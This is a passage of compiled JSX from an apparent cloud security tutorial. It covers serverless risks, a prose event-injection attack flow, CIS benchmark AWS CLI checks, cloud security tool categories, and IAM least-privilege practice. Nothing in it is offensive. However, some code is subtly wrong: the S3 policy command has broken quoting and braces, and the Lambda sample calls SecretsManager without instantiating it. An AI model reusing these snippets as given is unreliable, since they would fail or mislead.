          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logging & Monitoring Gaps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No audit trail for function invocations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudWatch/CloudTrail, X-Ray tracing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure 3rd-Party Dependencies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerable npm/pip/Maven packages"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Dependency scanning (Snyk, Dependabot)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Denial of Service"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Resource exhaustion via concurrent invocations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Function concurrency limits, API Gateway throttling"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Excessive Permissions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overly broad IAM roles (wildcard actions)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM policy simulation, Access Analyzer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Business Logic Flaws"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Account creation abuse, coupon misuse"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rate limiting, idempotency tokens"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "event-injection--deep-dive",
      children: "Event Injection — Deep Dive"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Attack Flow:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker identifies a function triggered by S3 upload, SQS message, or HTTP event."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker crafts a malicious event payload (SQL injection in filename, command in metadata, XSS in query params)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker sends the payload via function's event source."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Function processes the payload without validation."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker achieves code execution, data exfiltration, or privilege escalation."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Secure AWS Lambda Function:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-javascript",
        children: "// Secure Lambda handler with input validation\nconst { SecretsManager } = require('aws-sdk');\nconst Joi = require('joi');\n\n// Schema validation\nconst eventSchema = Joi.object({\n    userId: Joi.string().uuid().required(),\n    action: Joi.string().valid('CREATE', 'UPDATE', 'DELETE').required(),\n    data: Joi.object().max(5).required()\n});\n\nexports.handler = async (event, context) => {\n    // Step 1: Validate event structure\n    const { error, value } = eventSchema.validate(event);\n    if (error) {\n        console.error('Validation failed', error.details);\n        return { statusCode: 400, body: 'Invalid request structure' };\n    }\n\n    // Step 2: Verify IAM authorization\n    const authContext = context.identity;\n    if (!authContext || !authContext.cognitoIdentityId) {\n        return { statusCode: 403, body: 'Unauthorized' };\n    }\n\n    // Step 3: Retrieve secrets (not env vars)\n    const secrets = await SecretsManager.getSecretValue({\n        SecretId: process.env.DB_SECRET_ARN\n    }).promise();\n\n    // Step 4: Apply rate limiting via idempotency\n    // (Requires DynamoDB table for idempotency keys)\n\n    // Step 5: Execute business logic\n    const result = await processTransaction(value, secrets.SecretString);\n    return { statusCode: 200, body: JSON.stringify(result) };\n};\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis — Serverless Security:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Input validation:"
        }), " O(n) where n = payload field count"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "IAM authorization lookup:"
        }), " O(1) — AWS Cognito lookup"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Secrets retrieval:"
        }), " O(1) — cached after first invocation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cold start overhead:"
        }), " 100-500ms additional (JVM: up to 6 seconds)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "edge-cases--serverless",
      children: "Edge Cases — Serverless"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Event source replay:"
        }), " SQS events are retried. Ensure idempotency — same event processed twice should produce same result."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Warm container reuse:"
        }), " Environment variables from previous invocation persist. Never store per-request secrets in mutable global state."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Side-effect cleanup:"
        }), " Temporary file writes in ", (0,jsx_runtime.jsx)(_components.code, {
          children: "/tmp"
        }), " persist across invocations. Always clean up sensitive files."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Function chaining:"
        }), " Lambda invoking Lambda. Deep chains increase blast radius and make tracing difficult. Use Step Functions instead."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "VPC Lambda:"
        }), " Function in a VPC needs a NAT Gateway for internet access. Cold start latency increases (ENI attachment)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "cloud-compliance",
      children: "Cloud Compliance"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cis-benchmarks-for-aws-azure-gcp",
      children: "CIS Benchmarks for AWS, Azure, GCP"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The Center for Internet Security (CIS) publishes benchmark documents with prescriptive configuration checks for cloud platforms."
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "CIS Benchmark"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Number of Controls"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Areas"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Foundations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~150+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM, S3, logging, monitoring, networking"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Foundations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~120+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure AD, RBAC, storage, networking"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "GCP Foundations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~100+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM, GCS, GKE, networking, logging"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "AWS CIS Benchmark — Top Recommendations:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# 1.1 — Avoid root user usage\naws iam get-account-summary\naws iam get-credential-report\n\n# 1.3 — Enable IAM password policy\naws iam update-account-password-policy --minimum-password-length 14 \\\n  --require-uppercase-characters --require-lowercase-characters \\\n  --require-numbers --require-symbols --max-password-age 90\n\n# 2.1 — Enable CloudTrail in all regions\naws cloudtrail create-trail --name cis-cloudtrail --s3-bucket-name my-cis-logs \\\n  --is-multi-region-trail --enable-log-file-validation\n\n# 3.1 — Enable CloudWatch for unauthorized API calls\naws logs put-metric-filter --log-group-name CloudTrail/DefaultLogGroup \\\n  --filter-name UnauthorizedAPICalls \\\n  --filter-pattern '{ ($.errorCode = \"*UnauthorizedOperation\") || ($.errorCode = \"AccessDenied*\") }'\n\n# 4.1 — Restrict security group access\naws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0'\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Automated CIS Compliance with AWS Config:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Enable AWS Config\naws configservice put-configuration-recorder --configuration-recorder name=default,roleARN=arn:aws:iam::ACCOUNT:role/aws-service-role/config.amazonaws.com/AWSServiceRoleForConfig\n\n# Create a managed rule\naws configservice put-config-rule --config-rule '{\n  \"ConfigRuleName\": \"s3-bucket-public-read-prohibited\",\n  \"Source\": {\n    \"Owner\": \"AWS\",\n    \"SourceIdentifier\": \"S3_BUCKET_PUBLIC_READ_PROHIBITED\"\n  },\n  \"Scope\": {\n    \"ComplianceResourceTypes\": [\"AWS::S3::Bucket\"]\n  }\n}'\n\n# Get compliance summary\naws configservice get-compliance-summary --resource-types \"AWS::S3::Bucket\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cspm-cloud-security-posture-management",
      children: "CSPM (Cloud Security Posture Management)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "CSPM tools"
      }), " continuously monitor cloud environments for misconfigurations, compliance violations, and security risks."]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Capability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example Tools"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Configuration auditing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Check against CIS benchmarks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Config, Azure Policy, GCP CSPM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance reporting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SOC 2, PCI DSS, HIPAA alignment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prisma Cloud, Wiz, Orca"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IaC scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Check Terraform/CloudFormation pre-deploy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Checkov, tfsec"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Attack path analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find exploitable misconfiguration chains"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Wiz, Ermetic"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Identity analytics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detect over-permissive IAM roles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS IAM Access Analyzer"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cwpp-cloud-workload-protection-platform",
      children: "CWPP (Cloud Workload Protection Platform)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "CWPP protects workloads (VMs, containers, serverless) with agent-based and agentless security."
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Capability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "VMs"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Containers"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Serverless"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-malware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Agent-based scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Image scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Not applicable"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Intrusion detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Host IDS/IPS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime detection (Falco)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Function monitoring"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "File integrity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FIM agent"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Read-only rootFS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Immutable functions"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OS-level scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Image scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Dependency scanning"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network segmentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Host firewall"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network policies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VPC config"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "casb-cloud-access-security-broker",
      children: "CASB (Cloud Access Security Broker)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "CASBs sit between users and cloud services to enforce security policies."
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "CASB Mode"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Use Case"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "API-based"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Connects via cloud provider API"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shadow IT discovery"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Forward Proxy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Intercepts user-to-cloud traffic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DLP for SaaS apps"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reverse Proxy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sits in front of cloud apps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Zero-trust access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Log-based"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ingest cloud logs for analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance monitoring"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ciem-cloud-infrastructure-entitlement-management",
      children: "CIEM (Cloud Infrastructure Entitlement Management)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "CIEM focuses on managing cloud IAM permissions at scale."
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "CIEM Capability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Permission analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Identify unused permissions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS IAM Access Advisor"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Role analytics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Detect over-permissive roles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudSplainer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cross-account access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Monitor role chaining paths"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM Access Analyzer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Anomaly detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Flag unusual API calls"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "UEBA on CloudTrail"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "A&D Table — Cloud Security Tools:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Tool Category"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CSPM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Continuous compliance, automated remediation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alert fatigue, limited runtime protection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWPP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deep workload protection, anti-malware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Agent management overhead"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CASB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shadow IT discovery, DLP for SaaS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SSL decryption concerns, latency"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CIEM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM hygiene, unused permission cleanup"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires cross-account visibility"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "cloud-iam-best-practices",
      children: "Cloud IAM Best Practices"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A corporate office building. IAM is the badge system — who can enter which floors, which rooms, and at what times. Just because someone works on Floor 3 doesn't mean they can access the CEO's office on Floor 10."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "principle-1-least-privilege",
      children: "Principle #1: Least Privilege"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps — Implementing Least Privilege:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Start with a deny-all policy (implicit deny)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Identify the minimum permissions required for each role."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use AWS Managed Policies as starting points, then narrow to custom policies."
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Prefer resource-level permissions over wildcard (", (0,jsx_runtime.jsx)(_components.code, {
          children: "arn:aws:s3:::my-bucket/*"
        }), " vs ", (0,jsx_runtime.jsx)(_components.code, {
          children: "*"
        }), ")."]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use conditions (SourceIp, MfaAuth, time-based) to further restrict."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Regularly review unused permissions with IAM Access Advisor."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use Permission Boundaries for delegated administration."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Least privilege S3 access policy\naws iam put-user-policy --user-name backup-service --policy-name s3-backup-policy --policy-document '{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Action\": [\"s3:PutObject\", \"s3:GetObject\", \"s3:ListBucket\"],\n    \"Resource\": [\n      \"arn:aws:s3:::my-company-backups\",\n      \"arn:aws:s3:::my-company-backups/*\"\n    ],\n    \"Condition\": {\n      \"IpAddress\": {\"aws:SourceIp\": \"10.0.0.0/16\"},\n      \"Bool\": {\"aws:SecureTransport\": \"true\"}\n    }\n  }]'\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "iam-policy-simulation",
      children: "IAM Policy Simulation"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Simulate IAM policy to verify intended access\naws iam simulate-custom-policy --policy-input-list '[\n  {\"Effect\":\"Allow\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::my-bucket/*\"},\n  {\"Effect\":\"Deny\",\"Action\":\"s3:*\",\"Resource\":\"*\"}\n]' --action-names \"s3:GetObject\" \"s3:PutObject\"\n\n# Output:\n# {\n#   \"EvaluationResults\": [\n#     {\"EvalActionName\":\"s3:GetObject\",\"EvalDecision\":\"allowed\"},\n#     {\"EvalActionName\":\"s3:PutObject\",\"EvalDecision\":\"explicitDeny\"}\n#   ]\n# }\n\n# Simulate what a specific user can do\naws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCOUNT:user/bob \\\n  --action-names \"ec2:RunInstances\" \"ec2:TerminateInstances\" \"iam:CreateUser\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "iam-access-analyzer",
      children: "IAM Access Analyzer"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Enable IAM Access Analyzer\naws accessanalyzer create-analyzer --analyzer-name my-analyzer --type ACCOUNT\n\n# List findings (resources shared outside the account)\naws accessanalyzer list-findings --analyzer-arn arn:aws:access-analyzer:us-east-1:ACCOUNT:analyzer/my-analyzer\n\n# Sample findings:\n# - S3 bucket policy grants access to \"Principal\": \"*\"\n# - KMS key policy grants access to \"AWS\": \"*\"\n# - IAM role can be assumed by a different account\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run — Access Analyzer Policy Check:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Input: S3 bucket policy allowing public access\n1. Access Analyzer scans bucket policies\n2. Finds: Principal: \"*\" on bucket \"customer-data\"\n3. Checks: Any condition restricting access? No\n4. Determines: Publicly accessible\n5. Creates finding: HIGH severity, \"S3 bucket publicly accessible\"\n6. Sends to Security Hub\nOutput: Finding created with remediation steps\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis — Cloud IAM:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Policy evaluation (AWS):"
        }), " O(s) where s = number of statements in policy. Deny wins over Allow. Explicit Deny beats Allow beats Implicit Deny."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Access Analyzer scan:"
        }), " O(r + p) where r = number of resources, p = number of policies per resource"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Policy simulation:"
        }), " O(n * s) where n = actions simulated, s = statements evaluated"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "edge-cases--cloud-iam",
      children: "Edge Cases — Cloud IAM"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Resource-based policies (S3 bucket policy + IAM user policy):"
        }), " Combined evaluation — granted if EITHER policy allows (AND there's no explicit Deny). Confusing behavior for new cloud engineers."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cross-account roles:"
        }), " Trust policy (in target account) + permissions policy. Both must be configured correctly. Sts:AssumeRole required."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Service control policies (SCP) in AWS Organizations:"
        }), " SCPs are deny-by-default for member accounts. Even if IAM allows, SCP can block."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "PassRole permission:"
        }), " Required for EC2/ECS/Lambda to assume a role. If missing, resource can't start. If overly broad, privilege escalation risk."]
      }), "\n"]
